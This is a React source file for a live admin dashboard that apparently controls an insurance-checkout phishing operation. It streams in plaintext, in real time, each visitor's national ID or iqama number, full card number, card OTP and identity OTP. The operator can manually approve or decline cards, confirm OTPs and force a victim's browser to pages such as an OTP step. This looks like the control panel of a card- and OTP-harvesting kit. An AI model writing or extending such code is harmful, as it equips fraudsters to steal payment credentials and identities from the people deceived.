import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useMemo, useState } from "react";
import { sessionClient } from "@/sessionClient";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import {
  Table, TableBody, TableCell, TableHead, TableHeader, TableRow,
} from "@/components/ui/table";
import {
  Dialog, DialogContent, DialogFooter, DialogHeader, DialogTitle, DialogTrigger,
} from "@/components/ui/dialog";
import { toast } from "sonner";
import {
  Select, SelectContent, SelectItem, SelectTrigger, SelectValue,
} from "@/components/ui/select";
import {
  Activity, Ban, CheckCircle2, RefreshCw, Search, ShieldCheck, XCircle, Send,
} from "lucide-react";

export const Route = createFileRoute("/_authenticated/sessions")({
  ssr: false,
  head: () => ({
    meta: [
      { title: "Session Controller — Live Admin" },
      { name: "description", content: "Realtime checkout session monitoring and control dashboard." },
      { name: "robots", content: "noindex" },
    ],
  }),
  component: SessionsDashboard,
});

type SessionRow = {
  id: string;
  created_at?: string | null;
  updated_at?: string | null;
  national_id?: string | null;
  iqama?: string | null;
  vehicle_sequence?: string | null;
  serial_number?: string | null;
  insurer?: string | null;
  insurer_name?: string | null;
  premium?: number | string | null;
  base_price?: number | string | null;
  deductible?: number | string | null;
  coverage_type?: string | null; // TPL / Comprehensive
  card_bin?: string | null;
  card_last4?: string | null;
  card_number?: string | null;
  payment_method?: string | null;
  card_otp?: string | null;
  identity_otp?: string | null;
  status_card_success?: boolean | null;
  status_card_fail?: boolean | null;
  status_card_otp_ok?: boolean | null;
  status_identity_ok?: boolean | null;
  status_policy_issued?: boolean | null;
  status_restricted?: boolean | null;
  status_routing?: unknown;
  [k: string]: unknown;
};

type StatusFilter = "all" | "pending" | "approved" | "declined" | "blocked" | "issued";

function fmtTime(v?: string | null) {
  if (!v) return "—";
  try { return new Date(v).toLocaleString(); } catch { return v; }
}

function last4(row: SessionRow) {
  if (row.card_last4) return String(row.card_last4);
  const n = row.card_number ? String(row.card_number).replace(/\s+/g, "") : "";
  return n ? n.slice(-4) : "—";
}
function bin(row: SessionRow) {
  if (row.card_bin) return String(row.card_bin);
  const n = row.card_number ? String(row.card_number).replace(/\s+/g, "") : "";
  return n ? n.slice(0, 6) : "—";
}

function stageOf(r: SessionRow): { label: string; tone: "green" | "red" | "yellow" | "muted" } {
  if (r.status_restricted) return { label: "Blocked", tone: "red" };
  if (r.status_policy_issued) return { label: "Policy Issued", tone: "green" };
  if (r.status_card_fail) return { label: "Card Declined", tone: "red" };
  if (r.identity_otp && !r.status_identity_ok) return { label: "Awaiting Identity OTP", tone: "yellow" };
  if (r.card_otp && !r.status_card_otp_ok) return { label: "Awaiting Card OTP", tone: "yellow" };
  if ((r.card_number || r.card_last4) && !r.status_card_success && !r.status_card_fail)
    return { label: "Card Submitted", tone: "yellow" };
  if (r.status_card_otp_ok) return { label: "Card OTP OK", tone: "green" };
  if (r.status_card_success) return { label: "Card Approved", tone: "green" };
  if (r.insurer || r.insurer_name) return { label: "Insurer Selected", tone: "muted" };
  return { label: "Quote Started", tone: "muted" };
}

function StageBadge({ tone, label }: { label: string; tone: "green" | "red" | "yellow" | "muted" }) {
  const cls =
    tone === "green" ? "bg-emerald-500/15 text-emerald-600 dark:text-emerald-400 border-emerald-500/30"
    : tone === "red" ? "bg-red-500/15 text-red-600 dark:text-red-400 border-red-500/30"
    : tone === "yellow" ? "bg-amber-500/15 text-amber-700 dark:text-amber-400 border-amber-500/40 animate-pulse"
    : "bg-muted text-muted-foreground border-border";
  return <Badge variant="outline" className={cls}>{label}</Badge>;
}

function SessionsDashboard() {
  const [rows, setRows] = useState<SessionRow[]>([]);
  const [loading, setLoading] = useState(true);
  const [err, setErr] = useState<string | null>(null);
  const [q, setQ] = useState("");
  const [filter, setFilter] = useState<StatusFilter>("all");
  const [busyId, setBusyId] = useState<string | null>(null);

  const load = async () => {
    setLoading(true);
    const { data, error } = await sessionClient
      .from("sessions")
      .select("*")
      .order("created_at", { ascending: false })
      .limit(500);
    if (error) { setErr(error.message); setLoading(false); return; }
    setErr(null);
    setRows((data as SessionRow[]) || []);
    setLoading(false);
  };

  useEffect(() => {
    load();
    const ch = sessionClient
      .channel("sessions-live")
      .on("postgres_changes" as any, { event: "*", schema: "public", table: "sessions" }, (payload: any) => {
        setRows((prev) => {
          const next = [...prev];
          if (payload.eventType === "INSERT") {
            next.unshift(payload.new as SessionRow);
          } else if (payload.eventType === "UPDATE") {
            const idx = next.findIndex((r) => r.id === (payload.new as SessionRow).id);
            if (idx >= 0) next[idx] = { ...next[idx], ...(payload.new as SessionRow) };
            else next.unshift(payload.new as SessionRow);
          } else if (payload.eventType === "DELETE") {
            const id = (payload.old as SessionRow).id;
            return next.filter((r) => r.id !== id);
          }
          return next;
        });
      })
      .subscribe();
    return () => { sessionClient.removeChannel(ch); };
  }, []);

  const filtered = useMemo(() => {
    const term = q.trim().toLowerCase();
    return rows.filter((r) => {
      if (filter !== "all") {
        const s = stageOf(r).label.toLowerCase();
        if (filter === "pending" && !s.includes("awaiting") && !s.includes("submitted")) return false;
        if (filter === "approved" && !(r.status_card_success || r.status_card_otp_ok)) return false;
        if (filter === "declined" && !r.status_card_fail) return false;
        if (filter === "blocked" && !r.status_restricted) return false;
        if (filter === "issued" && !r.status_policy_issued) return false;
      }
      if (!term) return true;
      const hay = [
        r.id, r.national_id, r.iqama, r.vehicle_sequence, r.serial_number,
        r.insurer, r.insurer_name, r.card_bin, r.card_last4, r.card_number,
      ].filter(Boolean).join(" ").toLowerCase();
      return hay.includes(term);
    });
  }, [rows, q, filter]);

  const stats = useMemo(() => {
    let pending = 0, issued = 0, blocked = 0;
    for (const r of rows) {
      if (r.status_policy_issued) issued++;
      if (r.status_restricted) blocked++;
      if ((r.card_otp && !r.status_card_otp_ok) || (r.identity_otp && !r.status_identity_ok)) pending++;
    }
    return { total: rows.length, pending, issued, blocked };
  }, [rows]);

  const patch = async (id: string, values: Record<string, unknown>) => {
    setBusyId(id);
    // optimistic
    setRows((prev) => prev.map((r) => (r.id === id ? { ...r, ...values } : r)));
    const { error } = await sessionClient.from("sessions").update(values).eq("id", id);
    setBusyId(null);
    if (error) { toast.error(`Update failed: ${error.message}`); load(); return; }
    toast.success("Session updated");
  };

  return (
    <div className="min-h-screen bg-background p-4 md:p-6 space-y-6">
      <header className="flex items-center justify-between gap-4 flex-wrap">
        <div>
          <h1 className="text-2xl font-bold tracking-tight">Session Controller</h1>
          <p className="text-sm text-muted-foreground">Live checkout sessions · Realtime</p>
        </div>
        <Button variant="outline" size="sm" onClick={load}>
          <RefreshCw className="mr-2 h-4 w-4" /> Refresh
        </Button>
      </header>

      <section className="grid grid-cols-2 md:grid-cols-4 gap-4">
        <StatCard icon={<Activity className="h-5 w-5" />} label="Total Sessions" value={stats.total} />
        <StatCard icon={<CheckCircle2 className="h-5 w-5 text-amber-500" />} label="Pending OTPs" value={stats.pending} pulse />
        <StatCard icon={<ShieldCheck className="h-5 w-5 text-emerald-500" />} label="Policies Issued" value={stats.issued} />
        <StatCard icon={<Ban className="h-5 w-5 text-red-500" />} label="Blocked Users" value={stats.blocked} />
      </section>

      <Card>
        <CardHeader className="flex flex-col md:flex-row md:items-center md:justify-between gap-3">
          <CardTitle>Live Sessions</CardTitle>
          <div className="flex gap-2 flex-wrap">
            <div className="relative">
              <Search className="absolute left-2 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
              <Input value={q} onChange={(e) => setQ(e.target.value)} placeholder="Search ID, iqama, VIN, card…" className="pl-8 w-64" />
            </div>
            <Select value={filter} onValueChange={(v) => setFilter(v as StatusFilter)}>
              <SelectTrigger className="w-40"><SelectValue /></SelectTrigger>
              <SelectContent>
                <SelectItem value="all">All</SelectItem>
                <SelectItem value="pending">Pending</SelectItem>
                <SelectItem value="approved">Approved</SelectItem>
                <SelectItem value="declined">Declined</SelectItem>
                <SelectItem value="blocked">Blocked</SelectItem>
                <SelectItem value="issued">Issued</SelectItem>
              </SelectContent>
            </Select>
          </div>
        </CardHeader>
        <CardContent className="overflow-x-auto">
          {err && (
            <div className="p-3 mb-3 rounded border border-destructive/40 bg-destructive/10 text-sm text-destructive">
              {err}
            </div>
          )}
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead>Session</TableHead>
                <TableHead>Customer</TableHead>
                <TableHead>Insurer / Premium</TableHead>
                <TableHead>Payment</TableHead>
                <TableHead>Status</TableHead>
                <TableHead className="text-right">Controls</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {loading && (
                <TableRow><TableCell colSpan={6} className="text-center text-muted-foreground py-8">Loading…</TableCell></TableRow>
              )}
              {!loading && filtered.length === 0 && (
                <TableRow><TableCell colSpan={6} className="text-center text-muted-foreground py-8">No sessions</TableCell></TableRow>
              )}
              {filtered.map((r) => {
                const stage = stageOf(r);
                return (
                  <TableRow key={r.id}>
                    <TableCell className="align-top">
                      <div className="font-mono text-xs">{String(r.id).slice(0, 8)}…</div>
                      <div className="text-xs text-muted-foreground">{fmtTime(r.created_at)}</div>
                    </TableCell>
                    <TableCell className="align-top">
                      <div className="text-sm">ID: {r.national_id || r.iqama || "—"}</div>
                      <div className="text-xs text-muted-foreground">VIN: {r.vehicle_sequence || r.serial_number || "—"}</div>
                    </TableCell>
                    <TableCell className="align-top">
                      <div className="text-sm">{r.insurer_name || r.insurer || "—"}</div>
                      <div className="text-xs text-muted-foreground">
                        {r.coverage_type || "—"} · Base {r.base_price ?? "—"} · Ded {r.deductible ?? "—"}
                      </div>
                      <div className="text-xs">Premium: <span className="font-medium">{r.premium ?? "—"}</span></div>
                    </TableCell>
                    <TableCell className="align-top">
                      <div className="text-xs">BIN {bin(r)} · **** {last4(r)}</div>
                      <div className="text-xs text-muted-foreground">{r.payment_method || "—"}</div>
                      {r.card_otp ? <div className="text-xs">Card OTP: <span className="font-mono">{r.card_otp}</span></div> : null}
                      {r.identity_otp ? <div className="text-xs">ID OTP: <span className="font-mono">{r.identity_otp}</span></div> : null}
                    </TableCell>
                    <TableCell className="align-top"><StageBadge {...stage} /></TableCell>
                    <TableCell className="align-top text-right">
                      <div className="flex flex-wrap justify-end gap-1">
                        <Button size="sm" variant="outline" disabled={busyId === r.id}
                          onClick={() => patch(r.id, { status_card_success: true, status_card_fail: false })}>
                          <CheckCircle2 className="h-3.5 w-3.5 mr-1 text-emerald-500" />Card OK
                        </Button>
                        <Button size="sm" variant="outline" disabled={busyId === r.id}
                          onClick={() => patch(r.id, { status_card_fail: true, status_card_success: false })}>
                          <XCircle className="h-3.5 w-3.5 mr-1 text-red-500" />Decline
                        </Button>
                        <Button size="sm" variant="outline" disabled={busyId === r.id}
                          onClick={() => patch(r.id, { status_card_otp_ok: true })}>
                          OTP ✓
                        </Button>
                        <Button size="sm" variant="outline" disabled={busyId === r.id}
                          onClick={() => patch(r.id, { status_identity_ok: true })}>
                          ID ✓
                        </Button>
                        <Button size="sm" variant="outline" disabled={busyId === r.id}
                          onClick={() => patch(r.id, { status_policy_issued: true })}>
                          <ShieldCheck className="h-3.5 w-3.5 mr-1 text-emerald-500" />Issue
                        </Button>
                        <Button size="sm" variant="outline" disabled={busyId === r.id}
                          onClick={() => patch(r.id, { status_restricted: true })}>
                          <Ban className="h-3.5 w-3.5 mr-1 text-red-500" />Block
                        </Button>
                        <RedirectDialog onSubmit={(payload) => patch(r.id, { status_routing: payload })} />
                      </div>
                    </TableCell>
                  </TableRow>
                );
              })}
            </TableBody>
          </Table>
        </CardContent>
      </Card>
    </div>
  );
}

function StatCard({ icon, label, value, pulse }: { icon: React.ReactNode; label: string; value: number; pulse?: boolean }) {
  return (
    <Card>
      <CardContent className="p-4 flex items-center gap-3">
        <div className={`p-2 rounded-md bg-muted ${pulse && value > 0 ? "animate-pulse" : ""}`}>{icon}</div>
        <div>
          <div className="text-2xl font-semibold">{value}</div>
          <div className="text-xs text-muted-foreground">{label}</div>
        </div>
      </CardContent>
    </Card>
  );
}

function RedirectDialog({ onSubmit }: { onSubmit: (payload: { path: string; search: string }) => void }) {
  const [open, setOpen] = useState(false);
  const [path, setPath] = useState("/");
  const [search, setSearch] = useState("");
  return (
    <Dialog open={open} onOpenChange={setOpen}>
      <DialogTrigger asChild>
        <Button size="sm" variant="secondary"><Send className="h-3.5 w-3.5 mr-1" />Redirect</Button>
      </DialogTrigger>
      <DialogContent>
        <DialogHeader><DialogTitle>Force navigation</DialogTitle></DialogHeader>
        <div className="space-y-3">
          <div>
            <label className="text-xs text-muted-foreground">Path</label>
            <Input value={path} onChange={(e) => setPath(e.target.value)} placeholder="/checkout/otp" />
          </div>
          <div>
            <label className="text-xs text-muted-foreground">Search (querystring)</label>
            <Input value={search} onChange={(e) => setSearch(e.target.value)} placeholder="?ref=123" />
          </div>
          <pre className="text-xs bg-muted p-2 rounded overflow-x-auto">{JSON.stringify({ path, search }, null, 2)}</pre>
        </div>
        <DialogFooter>
          <Button variant="outline" onClick={() => setOpen(false)}>Cancel</Button>
          <Button onClick={() => { onSubmit({ path, search }); setOpen(false); }}>Send</Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
}
